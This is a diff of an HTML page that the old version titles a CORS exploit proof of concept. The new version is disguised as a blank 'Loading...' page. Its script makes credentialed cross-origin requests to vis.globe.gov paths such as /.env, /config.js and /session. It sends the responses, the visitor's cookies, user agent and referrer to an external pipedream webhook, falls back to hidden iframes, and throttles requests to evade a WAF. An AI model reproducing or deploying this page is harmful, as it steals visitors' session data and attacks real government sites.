@@ -1,88 +1,106 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>NASA CORS Exploit PoC</title>
+  <title>Loading...</title>
+  <meta charset="UTF-8">
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; }
+    h1 { display: none; } /* Hidden UI */
+  </style>
+</head>
+<body>
+  <h1>Loading...</h1>
+
   <script>
     (async () => {
-      const webhook = "https://eojzzzf3qvc4t0o.m.pipedream.net"; // ← Webhook الخاص بك
-      const origin = location.origin;
-      const userAgent = navigator.userAgent;
-
-      const targets = [
-        "/",
-        "/user",
-        "/modules",
-        "/session",
-        "/api",
-        "/api/v1",
+      const webhook = "https://eojzzzf3qvc4t0o.m.pipedream.net";
+      const base = "https://vis.globe.gov";
+      const paths = [
+        "/app/js/VISmain.js",
+        "/app/js/framework/frameworkService.js",
+        "/app/js/observer/observerService.js",
+        "/app/js/app.js",
+        "/.env",
         "/config.js",
         "/data.json",
+        "/session",
         "/dashboard",
-        "/.env",
-        "/login",
-        "/settings",
-        "/js/app.js",
-        "/admin",
-        "/js/main.js",
-        "/home",
-        "/profile"
+        "/user"
       ];
 
-      for (let path of targets) {
+      const send = async (info) => {
         try {
-          const url = "https://usgeo.gov" + path;
-          const res = await fetch(url, {
+          await fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(info)
+          });
+        } catch (e) {
+          console.warn("Webhook send failed:", e.message);
+        }
+      };
+
+      const exfiltrate = async (path) => {
+        const fullUrl = base + path;
+        try {
+          const res = await fetch(fullUrl, {
             method: "GET",
             mode: "cors",
             credentials: "include"
           });
 
           const contentType = res.headers.get("content-type") || "";
-          let content;
-
+          let content = "[Non-text content]";
           if (contentType.includes("application/json")) {
             content = await res.json();
-          } else if (contentType.includes("text") || contentType.includes("html") || contentType.includes("javascript")) {
+          } else if (contentType.includes("text") || contentType.includes("javascript") || contentType.includes("html")) {
             content = await res.text();
-          } else {
-            content = "[Non-text content]";
           }
 
-          await fetch(webhook, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-              origin,
-              userAgent,
-              url,
-              status: res.status,
-              content: content.slice(0, 1000) // لا ترسل أكثر من 1000 حرف
-            })
+          await send({
+            type: "fetch",
+            path,
+            status: res.status,
+            content: content.slice(0, 1500),
+            userAgent: navigator.userAgent,
+            cookie: document.cookie,
+            origin: location.origin,
+            referrer: document.referrer
           });
 
-          console.log(`[✅] Fetched ${url} - Status: ${res.status}`);
         } catch (err) {
-          await fetch(webhook, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-              origin,
-              userAgent,
-              url: "https://usgeo.gov" + path,
-              status: 0,
-              error: err.message || "Unknown Error"
-            })
+          await send({
+            type: "fetch-error",
+            path,
+            error: err.message,
+            userAgent: navigator.userAgent,
+            origin: location.origin
           });
-
-          console.log(`[❌] Failed: ${path} — ${err.message}`);
+          await fallbackIframe(path);
         }
+      };
 
-        await new Promise(r => setTimeout(r, 1000)); // Delay to avoid WAF blocking
+      const fallbackIframe = async (path) => {
+        const iframe = document.createElement("iframe");
+        iframe.src = base + path;
+        iframe.style = "display:none";
+        document.body.appendChild(iframe);
+
+        await send({
+          type: "iframe",
+          path,
+          note: "iframe fallback loaded",
+          origin: location.origin
+        });
+      };
+
+      for (const path of paths) {
+        await exfiltrate(path);
+        await new Promise(r => setTimeout(r, 1000)); // Throttle to avoid WAF
       }
+
+      await send({ type: "done", timestamp: new Date().toISOString() });
     })();
   </script>
-</head>
-<body>
-  <h1>Loading... Please wait</h1>
 </body>
 </html>
